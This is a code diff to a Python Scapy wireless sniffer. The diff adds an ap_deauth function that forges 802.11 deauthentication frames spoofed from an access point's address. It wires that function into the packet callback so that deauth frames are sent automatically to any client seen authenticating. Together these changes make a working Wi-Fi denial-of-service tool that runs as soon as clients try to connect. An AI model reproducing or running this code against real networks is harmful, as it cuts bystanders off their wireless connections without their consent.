@@ -12,12 +12,23 @@ def callback(packet):
         #if packet.type == 0 and packet.subtype in (0, 2, 4):
             #print(f"Packet: {packet.summary()}")
             freq = packet[RadioTap].ChannelFrequency
-            channel = list(filter(lambda x: x[1]['freq'] == freq, channels.items()))[0][0]
+            if freq is not None:
+                channel = list(filter(lambda x: x[1]['freq'] == freq, channels.items()))[0][0]
+            else:
+                channel = 0
             signal = packet[RadioTap].dBm_AntSignal
             client_addr = packet.addr2
+            payload_name = packet.payload.name
 
             # Capture management frames used from clients
             #  -> AssociationRequest, ReassociationRequest, ProbeRequest
+
+            if packet.haslayer(Dot11Auth):
+                client_addr = packet.addr1
+                bssid_addr = packet.addr2
+                print(f"{Fore.YELLOW}[Authentication] bssid: {bssid_addr}, cli: {client_addr}")
+
+                Thread(target=ap_deauth, args=[scan_iface, bssid_addr, client_addr, 2]).start()
 
             if packet.haslayer(Dot11AssoReq):
                 client_addr = packet.addr2
@@ -61,6 +72,18 @@ def callback(packet):
                         print(f"{Fore.RED}[Beacon] New AP bssid: {bssid}, ssid: {ssid}, channel: {channel}, signal: {dbm_signal}, crypto: {crypto}")
                     networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
 
+def ap_deauth(iface, ap_mac, client_mac, count):
+    packet = RadioTap() / \
+             Dot11(type=0,       # Management type
+               subtype=12,       # Deauthentication subtype
+               addr1=client_mac,
+               addr2=ap_mac,
+               addr3=ap_mac) / \
+             Dot11Deauth(reason=7)
+
+    for c in range(count):
+        print(f"{Fore.GREEN}[Deauth] Sending to cli: {client_mac}, bssid: {ap_mac}")
+        send_res = sendp(packet, iface=iface, verbose=False)
 
 def print_all(sleep=1):
     while True:
